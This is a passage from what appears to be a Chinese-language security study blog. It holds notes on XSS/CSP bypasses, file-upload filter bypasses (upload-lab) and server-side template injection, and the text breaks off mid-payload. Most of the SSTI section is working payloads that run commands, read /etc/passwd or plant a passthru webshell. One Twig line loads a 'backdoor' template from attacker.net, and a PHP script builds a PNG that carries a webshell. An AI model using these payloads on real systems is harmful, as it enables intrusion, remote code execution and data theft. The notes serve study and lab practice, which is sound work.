+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div data-role=popup id=&#x27;&lt;script&gt;alert(hack)&lt;/script&gt;&#x27;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
+<p>5.利用meta标签实现url跳转<br>如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;3;url=https://example.com&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>6.CRLF绕过<br>当一个页面存在CRLF漏洞时，且我们的可控点在CSP上方，就可以通过注入回车换行，将CSP挤到HTTP返回体中<br>7.站点可控静态资源绕过<br>要求站点存在可控静态资源，且站点在CSP白名单中<br>如：</p>
+<figure class="highlight plaintext"><figcaption><span>http-equiv</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">www.google-analytics.com中可以自定义JavaScript，以此绕过</span><br><span class="line">8.站点可控JSONP绕过</span><br><span class="line">站点存在可控的JSONP，且站点在CSP白名单中</span><br><span class="line">有些站点会让jsonp不返回html类型防止直接的反射型XSS，但是如果将url插入到script标签中，除非设置x-content-type-options头，否者尽管返回类型不一致，浏览器依旧会当成js进行解析</span><br><span class="line">9.Base-uri绕过</span><br><span class="line">script-src只使用nonce，没有额外设置base-uri，页面引用存在相对路径的script标签</span><br><span class="line">当服务器CSP script-src采用了nonce时，如果只设置了default-src没有额外设置base-uri，就可以使用base标签使当前页面上下文为自己的vps，如果页面中的合法script标签采用了相对路径，那么最终加载的js就是针对base标签中指定url的相对路径。如果页面的script-src不是采用的nonce而是self或者域名ip，则不能使用此方法</span><br><span class="line">10.不完整script标签绕过nonce</span><br><span class="line">适用于可控点在合法script标签上方,且其中没有其他标签，XSS页面的CSP script-src只采用了nonce方式</span><br><span class="line"></span><br><span class="line">特性：</span><br><span class="line"> 1.当浏览器碰到一个左尖括号时，会变成标签开始状态，然后会一直持续到碰到右尖括号为止，在其中的数据都会被当成标签名或者属性</span><br><span class="line"> 2.当一个标签存在两个同名属性时，第二个属性的属性名及其属性值都会被浏览器忽略</span><br><span class="line"> 3.当标签未闭合时，html解析器会一直去寻找下一个引号，从而闭合src属性，所以说在下一个引号前的标签都不会被解析</span><br><span class="line"></span><br><span class="line">例：</span><br></pre></td></tr></table></figure>
+<?php header("X-XSS-Protection:0");?>
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'nonce-xxxxx'">
+<?php echo $_GET['xss']?>
+<script nonce='xxxxx'>
+  //do some thing
+</script>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可使用</span><br></pre></td></tr></table></figure>
+?xss=<script src=data:text/plain,alert(1)
+```
+nonce会进入不完整script标签成为其属性名
+11.借助外域资源绕过
+适用于可以进行外域资源引用，且注入点在CSP策略下方
+当设置的CSP策略指令img-src允许加载外域图片资源，可以尝试利用img标签XSS恶意代码，从而注入到该网页。当标签未闭合时，html解析器会一直去寻找下一个引号，从而闭合src属性，所以说在下一个引号前的标签都不会被解析，从而绕过CSP。
+12.PDF XSS绕过
+适用于没有设置object-src，或者object-src没有设置为'none'，pdf用的是chrome的默认解析器。
+原理为攻击者将恶意代码写入PDF文件中，将此图片利用文件上传或者创建在自己的VPS上，受害者访问从而进行XSS攻击。不能获取页面cookie，但是可以弹窗，url跳转等。
+13.SVG矢量图绕过
+原理同PDF XSS绕过
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/08/10/xssnote/" data-id="cll59g8v30003agud3wdoao8k" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-uploadnote" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/08/10/uploadnote/" class="article-date">
+  <time datetime="2023-08-10T12:33:46.000Z" itemprop="datePublished">2023-08-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/08/10/uploadnote/">2023/08/10：upload笔记</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><a target="_blank" rel="noopener" href="https://paper.seebug.org/560/">https://paper.seebug.org/560/</a></p>
+<h2 id="代码相关"><a href="#代码相关" class="headerlink" title="代码相关"></a>代码相关</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_FILES\[‘file’][‘name’] 客户端文件名称</span><br><span class="line">$_FILES\[‘file’][‘type’] 文件的MIME类型</span><br><span class="line">$_FILES\[‘file’][‘size’] 文件大小 单位字节</span><br><span class="line">$_FILES\[‘file’][‘tmp_name’] 文件被上传后再服务器端临时文件名，可以在php.ini中指定</span><br></pre></td></tr></table></figure>
+<p>文件上传结束后，默认的被储存在临时文件夹中，这时必须把他从临时目录中删除或移动到其他地方，可使用<code>copy()</code>或<code>move_uploaded_file()</code><br>可能存在错误使用的函数：<code>empty()、isset()、strpos()、rename()、iconv()、copy()</code></p>
+<h2 id="校验过程"><a href="#校验过程" class="headerlink" title="校验过程"></a>校验过程</h2><p>1.客户端javascript检测<br>（上传文件）<br>2.服务端MIME检测<br>3.目录路径检测<br>4.文件扩展名检测<br>5.文件内容检测</p>
+<h2 id="校验方式与绕过"><a href="#校验方式与绕过" class="headerlink" title="校验方式与绕过"></a>校验方式与绕过</h2><h3 id="javascript检测（upload-lab-pass-1）"><a href="#javascript检测（upload-lab-pass-1）" class="headerlink" title="javascript检测（upload-lab pass 1）"></a>javascript检测（upload-lab pass 1）</h3><p>通常验证上传文件的扩展名是否符合验证条件</p>
+<h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><p>1.浏览器禁用js<br>2.F12修改js代码绕过验证<br>3.使用burp抓包直接提交，绕过js验证</p>
+<h3 id="MIME（content-type字段校验）（upload-lab-pass-2）"><a href="#MIME（content-type字段校验）（upload-lab-pass-2）" class="headerlink" title="MIME（content-type字段校验）（upload-lab pass 2）"></a>MIME（content-type字段校验）（upload-lab pass 2）</h3><p>MIME type代表互联网媒体类型，在html文件中可以使用content-type属性表示，描述了文件类型的互联网标准。Response对象通过设置ContentType使客户端浏览器，区分不同种类的数据，并根据不同的MIME调用浏览器内不同的程序嵌入模块来处理相应的数据。</p>
+<h4 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h4><p>使用Burp截取上传数据包，修改Content-Type的值</p>
+<h3 id="文件扩展名检测"><a href="#文件扩展名检测" class="headerlink" title="文件扩展名检测"></a>文件扩展名检测</h3><h4 id="方法-1：-htaccess（upload-lab-pass-4）"><a href="#方法-1：-htaccess（upload-lab-pass-4）" class="headerlink" title="方法 1：.htaccess（upload-lab pass 4）"></a>方法 1：.htaccess（upload-lab pass 4）</h4><p>配合Apache的.htaccess文件上传解析漏洞<br>通过htaccess文件可以实现改变文件扩展名等操作绕过检测</p>
+<h4 id="方法-2：解析缺陷绕过（upload-lab-pass-18）"><a href="#方法-2：解析缺陷绕过（upload-lab-pass-18）" class="headerlink" title="方法 2：解析缺陷绕过（upload-lab pass 18）"></a>方法 2：解析缺陷绕过（upload-lab pass 18）</h4><p>Apache的解析漏洞主要特性为Apache是从后面开始检查后缀，按最后一个合法后缀执行，将木马的后缀进行修改为允许上传的类型后，即可成功绕过验证，最终拿到权限。<br>例如将后缀修改为<code>.7z、.cab、.zip、.bmp</code></p>
+<h4 id="方法-3：目录路径检测解析绕过"><a href="#方法-3：目录路径检测解析绕过" class="headerlink" title="方法 3：目录路径检测解析绕过"></a>方法 3：目录路径检测解析绕过</h4><p>例如，将保存文件的相对路径<code>uploadimg/</code>改为<code>uploadimg/1.asp/</code>，<code>filename=&quot;yijuhua.asp&quot;</code>改为<code>filename=&quot;yijuhua.asp/1.jpg&quot;</code>，上传文件的名字为<code>yijuhua.asp/1.jpg</code>时服务器会从头部查找查找”.”号，然后查找”/“，如果有则内存截断，原文件会被解析为<code>/yijuhua.asp</code></p>
+<h4 id="方法-4：解析缺陷绕过（与上类似）"><a href="#方法-4：解析缺陷绕过（与上类似）" class="headerlink" title="方法 4：解析缺陷绕过（与上类似）"></a>方法 4：解析缺陷绕过（与上类似）</h4><p>例如，将保存文件的相对路径<code>uploadimg/</code>改为<code>uploadimg/1.php</code>，<code>filename=&quot;yijuhua.php&quot;</code>改为<code>filename=&quot;yijuhua.jpg&quot;</code>，文件的名字为<code>1.php;yijuhua.jpg</code>会作为php解析，原理类似。</p>
+<h4 id="方法-5：黑名单绕过"><a href="#方法-5：黑名单绕过" class="headerlink" title="方法 5：黑名单绕过"></a>方法 5：黑名单绕过</h4><p>1.使用大小写绕过（针对对大小写不敏感的系统如windows）<br>2.使用黑名单外的脚本类型，如：php5,asa 和 cer等（IIS默认支持解析.asp,.cdx, .asa,.cer等）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module</span><br><span class="line">    Working in PHPv8: .php, .php4, .php5, .phtml, .module, .inc, .hphp, .ctp</span><br><span class="line"></span><br><span class="line">ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml</span><br><span class="line"></span><br><span class="line">Jsp: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action</span><br><span class="line"></span><br><span class="line">Coldfusion: .cfm, .cfml, .cfc, .dbm</span><br><span class="line"></span><br><span class="line">Flash: .swf</span><br><span class="line"></span><br><span class="line">Perl: .pl, .cgi</span><br><span class="line"></span><br><span class="line">Erlang Yaws Web Server: .yaws</span><br></pre></td></tr></table></figure>
+<p>3.配合操作系统文件命令规则<br>4.双扩展名之间使用00截断，绕过验证上传恶意代码：<code>test.php%00.jpg</code><br>5.超长文件名截断上传（windows 258byte | linux 4096byte）<br>6.空格及点绕过<br>7.<code>::$DATA</code>绕过</p>
+<h4 id="方法-6：服务端检测文件内容配合文件包含漏洞"><a href="#方法-6：服务端检测文件内容配合文件包含漏洞" class="headerlink" title="方法 6：服务端检测文件内容配合文件包含漏洞"></a>方法 6：服务端检测文件内容配合文件包含漏洞</h4><p>如：先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；然后再上传一个php的文件，内容为<code>&lt;?php Include(“上传的txt文件路径”);?&gt;</code>，php文件就会去引用txt文件的内容，从而绕过校验</p>
+<h4 id="方法-7：PHP特性（使用数组绕过）"><a href="#方法-7：PHP特性（使用数组绕过）" class="headerlink" title="方法 7：PHP特性（使用数组绕过）"></a>方法 7：PHP特性（使用数组绕过）</h4><p>如：<code>file_put_contents()</code>函数的第二个参数，可以是数组；然后，如果代码里用正则匹配 bad word 的时候，对一个数组进行正则匹配没用</p>
+<h4 id="方法-8：服务端检测文件头（upload-lab-pass-15）"><a href="#方法-8：服务端检测文件头（upload-lab-pass-15）" class="headerlink" title="方法 8：服务端检测文件头（upload-lab pass 15）"></a>方法 8：服务端检测文件头（upload-lab pass 15）</h4><p>不同文件头（PHP使用getimagesize函数验证）：<br>PNG： 文件头标识 (8 bytes) 89 50 4E 47 0D 0A 1A 0A<br>JPEG： 文件头标识 (2 bytes): 0xff, 0xd8 (SOI) (JPEG 文件标识)<br>GIF： 文件头标识 (6 bytes) 47 49 46 38 39(37) 61<br>在恶意脚本前加上允许上传文件的头标识</p>
+<h4 id="方法-8：竞争上传（upload-lab-pass-17）"><a href="#方法-8：竞争上传（upload-lab-pass-17）" class="headerlink" title="方法 8：竞争上传（upload-lab pass 17）"></a>方法 8：竞争上传（upload-lab pass 17）</h4><p>原代码存在逻辑漏洞，如先上传文件，检测不通过后再删除，此时可以使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件</p>
+<h4 id="方法-9：二次渲染（upload-lab-pass-16）"><a href="#方法-9：二次渲染（upload-lab-pass-16）" class="headerlink" title="方法 9：二次渲染（upload-lab pass 16）"></a>方法 9：二次渲染（upload-lab pass 16）</h4><p>GIF:<br>首先将GIF文件与php一句话木马合并，再将上传后的文件下载与合并后的文件对比（如010_Editor），在未被渲染的部分写一句话木马<br>PNG:<br>需要脚本构造图片</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,</span><br><span class="line">           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,</span><br><span class="line">           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,</span><br><span class="line">           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,</span><br><span class="line">           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,</span><br><span class="line">           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,</span><br><span class="line">           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,</span><br><span class="line">           0x66, 0x44, 0x50, 0x33);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">$img = imagecreatetruecolor(32, 32);</span><br><span class="line"> </span><br><span class="line">for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;</span><br><span class="line">   $r = $p[$y];</span><br><span class="line">   $g = $p[$y+1];</span><br><span class="line">   $b = $p[$y+2];</span><br><span class="line">   $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">   imagesetpixel($img, round($y / 3), 0, $color);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">imagepng($img,&#x27;./1.png&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>1.准备png图片<br>2.在cmd使用php命令执行该脚本生成新png图片<br>3.使用新图片上传<br>4.在文件包含漏洞处进行传参</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/08/10/uploadnote/" data-id="cll59g8v10002agudgi1ybycm" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-sstinote" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/08/10/sstinote/" class="article-date">
+  <time datetime="2023-08-10T12:33:32.000Z" itemprop="datePublished">2023-08-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/08/10/sstinote/">2023/08/10：ssti笔记</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</a></p>
+<h2 id="模板类型判断"><a href="#模板类型判断" class="headerlink" title="模板类型判断"></a>模板类型判断</h2><img src="/2023/08/10/sstinote/ssti.png" class="">
+<img src="/2023/08/10/sstinote/ssti2.png" class="">
+<p>可用判断语句<code>$&#123;&#123;<%[%'"&#125;&#125;%\</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125;</span><br><span class="line">$&#123;7*7&#125;</span><br><span class="line">&lt;%= 7*7 %&gt;</span><br><span class="line">$&#123;&#123;7*7&#125;&#125;</span><br><span class="line">#&#123;7*7&#125;</span><br><span class="line">*&#123;7*7&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><h3 id="Java-Basic-injection"><a href="#Java-Basic-injection" class="headerlink" title="Java - Basic injection"></a>Java - Basic injection</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$&#123;7*7&#125;</span><br><span class="line">$&#123;&#123;7*7&#125;&#125;</span><br><span class="line">$&#123;class.getClassLoader()&#125;</span><br><span class="line">$&#123;class.getResource(&quot;&quot;).getPath()&#125;</span><br><span class="line">$&#123;class.getResource(&quot;../../../../../index.htm&quot;).getContent()&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Java-Retrieve-the-system’s-environment-variables"><a href="#Java-Retrieve-the-system’s-environment-variables" class="headerlink" title="Java - Retrieve the system’s environment variables"></a>Java - Retrieve the system’s environment variables</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;T(java.lang.System).getenv()&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Java-Retrieve-etc-passwd"><a href="#Java-Retrieve-etc-passwd" class="headerlink" title="Java - Retrieve /etc/passwd"></a>Java - Retrieve /etc/passwd</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;T(java.lang.Runtime).getRuntime().exec(&#x27;cat etc/passwd&#x27;)&#125;</span><br><span class="line"></span><br><span class="line">$&#123;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="FreeMarker-Java"><a href="#FreeMarker-Java" class="headerlink" title="FreeMarker (Java)"></a>FreeMarker (Java)</h3><p>判断类型：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125; = &#123;&#123;7*7&#125;&#125;</span><br><span class="line">$&#123;7*7&#125; = 49</span><br><span class="line">#&#123;7*7&#125; = 49 -- (legacy)</span><br><span class="line">$&#123;7*&#x27;7&#x27;&#125; Nothing</span><br><span class="line">$&#123;foobar&#125;</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ex = &quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123; ex(&quot;id&quot;)&#125;</span><br><span class="line">[#assign ex = &#x27;freemarker.template.utility.Execute&#x27;?new()]$&#123; ex(&#x27;id&#x27;)&#125;</span><br><span class="line">$&#123;&quot;freemarker.template.utility.Execute&quot;?new()(&quot;id&quot;)&#125;</span><br><span class="line"></span><br><span class="line">$&#123;product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve(&#x27;/home/carlos/my_password.txt&#x27;).toURL().openStream().readAllBytes()?join(&quot; &quot;)&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Freemarker-Sandbox-bypass（版本低于2-3-30）"><a href="#Freemarker-Sandbox-bypass（版本低于2-3-30）" class="headerlink" title="Freemarker - Sandbox bypass（版本低于2.3.30）"></a>Freemarker - Sandbox bypass（版本低于2.3.30）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign classloader=article.class.protectionDomain.classLoader&gt;</span><br><span class="line">&lt;#assign owc=classloader.loadClass(&quot;freemarker.template.ObjectWrapper&quot;)&gt;</span><br><span class="line">&lt;#assign dwf=owc.getField(&quot;DEFAULT_WRAPPER&quot;).get(null)&gt;</span><br><span class="line">&lt;#assign ec=classloader.loadClass(&quot;freemarker.template.utility.Execute&quot;)&gt;</span><br><span class="line">$&#123;dwf.newInstance(ec,null)(&quot;id&quot;)&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Jinjava-Java"><a href="#Jinjava-Java" class="headerlink" title="Jinjava (Java)"></a>Jinjava (Java)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;a&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance().getEngineByName(&#x27;JavaScript&#x27;).eval(\&quot;new java.lang.String(&#x27;xxx&#x27;)\&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;a&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance().getEngineByName(&#x27;JavaScript&#x27;).eval(\&quot;var x=new java.lang.ProcessBuilder; x.command(\\\&quot;whoami\\\&quot;); x.start()\&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;a&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance().getEngineByName(&#x27;JavaScript&#x27;).eval(\&quot;var x=new java.lang.ProcessBuilder; x.command(\\\&quot;netstat\\\&quot;); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;a&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance().getEngineByName(&#x27;JavaScript&#x27;).eval(\&quot;var x=new java.lang.ProcessBuilder; x.command(\\\&quot;uname\\\&quot;,\\\&quot;-a\\\&quot;); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Smarty-PHP"><a href="#Smarty-PHP" class="headerlink" title="Smarty (PHP)"></a>Smarty (PHP)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;$smarty.version&#125;</span><br><span class="line">&#123;php&#125;echo `id`;&#123;/php&#125; //deprecated in smarty v3</span><br><span class="line">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;,self::clearConfig())&#125;</span><br><span class="line">&#123;system(&#x27;ls&#x27;)&#125; // compatible v3</span><br><span class="line">&#123;system(&#x27;cat index.php&#x27;)&#125; // compatible v3</span><br></pre></td></tr></table></figure>
+<h3 id="Twig-PHP"><a href="#Twig-PHP" class="headerlink" title="Twig (PHP)"></a>Twig (PHP)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125; = 49</span><br><span class="line">$&#123;7*7&#125; = $&#123;7*7&#125;</span><br><span class="line">&#123;&#123;7*&#x27;7&#x27;&#125;&#125; = 49</span><br><span class="line">&#123;&#123;1/0&#125;&#125; = Error</span><br><span class="line">&#123;&#123;foobar&#125;&#125; Nothing</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#Get Info</span><br><span class="line">&#123;&#123;_self&#125;&#125; #(Ref. to current application)</span><br><span class="line">&#123;&#123;_self.env&#125;&#125;</span><br><span class="line">&#123;&#123;dump(app)&#125;&#125;</span><br><span class="line">&#123;&#123;app.request.server.all|join(&#x27;,&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">#File read</span><br><span class="line">&quot;&#123;&#123;&#x27;/etc/passwd&#x27;|file_excerpt(1,30)&#125;&#125;&quot;@</span><br><span class="line"></span><br><span class="line">#Exec code</span><br><span class="line">&#123;&#123;_self.env.setCache(&quot;ftp://attacker.net:2121&quot;)&#125;&#125;&#123;&#123;_self.env.loadTemplate(&quot;backdoor&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;system&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;whoami&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;system&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id;uname -a;hostname&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&#x27;id&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&#x27;cat\x20/etc/passwd&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&#x27;cat$IFS/etc/passwd&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Handlebars-NodeJS"><a href="#Handlebars-NodeJS" class="headerlink" title="Handlebars (NodeJS)"></a>Handlebars (NodeJS)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;#with &quot;s&quot; as |string|&#125;&#125;</span><br><span class="line">  &#123;&#123;#with &quot;e&quot;&#125;&#125;</span><br><span class="line">    &#123;&#123;#with split as |conslist|&#125;&#125;</span><br><span class="line">      &#123;&#123;this.pop&#125;&#125;</span><br><span class="line">      &#123;&#123;this.push (lookup string.sub &quot;constructor&quot;)&#125;&#125;</span><br><span class="line">      &#123;&#123;this.pop&#125;&#125;</span><br><span class="line">      &#123;&#123;#with string.split as |codelist|&#125;&#125;</span><br><span class="line">        &#123;&#123;this.pop&#125;&#125;</span><br><span class="line">        &#123;&#123;this.push &quot;return require(&#x27;child_process&#x27;).exec(&#x27;whoami&#x27;);&quot;&#125;&#125;</span><br><span class="line">        &#123;&#123;this.pop&#125;&#125;</span><br><span class="line">        &#123;&#123;#each conslist&#125;&#125;</span><br><span class="line">          &#123;&#123;#with (string.sub.apply 0 codelist)&#125;&#125;</span><br><span class="line">            &#123;&#123;this&#125;&#125;</span><br><span class="line">          &#123;&#123;/with&#125;&#125;</span><br><span class="line">        &#123;&#123;/each&#125;&#125;</span><br><span class="line">      &#123;&#123;/with&#125;&#125;</span><br><span class="line">    